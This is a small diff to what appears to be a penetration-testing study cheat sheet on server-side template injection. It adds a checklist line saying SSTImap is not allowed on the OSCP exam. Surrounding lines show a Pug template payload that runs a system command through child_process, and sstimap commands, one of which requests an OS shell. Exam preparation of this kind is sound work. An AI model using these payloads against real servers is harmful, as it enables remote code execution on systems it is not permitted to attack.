@@ -47,6 +47,7 @@ EJS, then Pug:
 #{process.mainModule.require('child_process').execSync('id')}
 
 ## Let sstimap do it
+- [ ] Not on the OSCP exam: SSTImap is kept out as a safe reading because it automates exploitation; OffSec does not name it
 The * marks where the payload goes:
 sstimap -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=*'
 sstimap -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=*' --os-shell
